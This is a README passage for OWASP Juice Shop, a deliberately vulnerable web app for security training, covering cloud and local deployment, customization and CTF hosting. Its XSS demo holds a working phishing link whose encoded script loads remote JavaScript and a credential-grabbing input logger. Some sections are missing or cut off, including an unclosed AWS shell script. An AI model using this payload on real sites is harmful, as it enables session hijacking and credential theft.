   [log in to your account](https://id.heroku.com/login)
2. Click the button below and follow the instructions

[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)

> This is the quickest way to get a running instance of Juice Shop! If
> you have forked this repository, the deploy button will automatically
> pick up your fork for deployment! As long as you do not perform any
> DDoS attacks you are free to use any tools or scripts to hack your
> Juice Shop instance on Heroku!

### From Sources

1. Install [node.js](#nodejs-version-compatibility)
2. Run `git clone https://github.com/bkimminich/juice-shop.git` (or
   clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
   of the repository)
3. Go into the cloned folder with `cd juice-shop`
4. Run `npm install` (only has to be done before first start or when you
   change the source code)
5. Run `npm start`
6. Browse to <http://localhost:3000>

### Packaged Distributions [![GitHub release](https://img.shields.io/github/downloads/bkimminich/juice-shop/total.svg)](https://github.com/bkimminich/juice-shop/releases/latest) [![SourceForge](https://img.shields.io/sourceforge/dt/juice-shop.svg)](https://sourceforge.net/projects/juice-shop/)

1. Install a 64bit [node.js](#nodejs-version-compatibility) on your
   Windows (or Linux) machine

1. Setup an _Amazon Linux AMI_ instance
2. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
   copy the script below into _User Data_
3. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
   for HTTP
4. Launch instance
5. Browse to your instance's public DNS

```
#!/bin/bash
yum update -y
yum install -y docker
service docker start
docker pull bkimminich/juice-shop

> Technically Amazon could view hacking activity on any EC2 instance as
> an attack on their AWS infrastructure! We highly discourage aggressive
> scanning or automated brute force attacks! You have been warned!

### Azure Web App for Containers

1. Open your [Azure CLI](https://azure.github.io/projects/clis/) **or**
   login to the [Azure Portal](https://portal.azure.com), open the
   _CloudShell_ and then choose _Bash_ (not PowerShell).
2. Create a resource group by running `az group create --name <group
   name> --location <location name, e.g. "East US">`
3. Create an app service plan by running `az appservice plan create
   --name <plan name> --resource-group <group name> --sku S1 --is-linux`
4. Create a web app with the
   [Juice Shop Docker](https://registry.hub.docker.com/u/bkimminich/juice-shop/)
   image by running the following (on one line in the bash shell) `az
   webapp create --resource-group <group name> --plan <plan name> `
   `--name <app name> --deployment-container-image-name
   bkimminich/juice-shop`

## Node.js version compatibility

OWASP Juice Shop officially supports the following versions of
[node.js](http://nodejs.org) in line as close as possible with the
official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
images and packaged distributions are offered accordingly:

| node.js             | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop) | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
|:--------------------|:------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
| 10.x (:microscope:) | `snapshot` (preview from `develop` branch)                              | `juice-shop-<version>_node10_windows_x64.zip`, `juice-shop-<version>_node10_linux_x64.tgz` |
| __9.x__             | __`latest`__ (current official release)                                 | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
| 8.x                 |                                                                         | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |

## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)

Feel free to have a look at the latest version of OWASP Juice Shop:
<http://demo.owasp-juice.shop>

> This is a deployment-test and sneak-peek instance only! You are __not
> supposed__ to use this instance for your own hacking endeavours! No
> guaranteed uptime! Guaranteed stern looks if you break it!

## Customization

Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
customized in its content and look & feel.

For detailed instructions and examples please refer to
[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).

## CTF-Extension

If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
recommend you set it up along with a [CTFd](https://ctfd.io) server
conveniently using the official
[`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
tool.

For step-by-step instructions and examples please refer to
[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
of our companion guide ebook.

## XSS Demo

To show the possible impact of
[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
can download this
[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
and run `docker-compose up` to start the juice-shop and the
shake-logger. Assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab
credentials! This could easily run on a 3rd party server in real life!

> You can also find a recording of this attack in action on YouTube:
> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
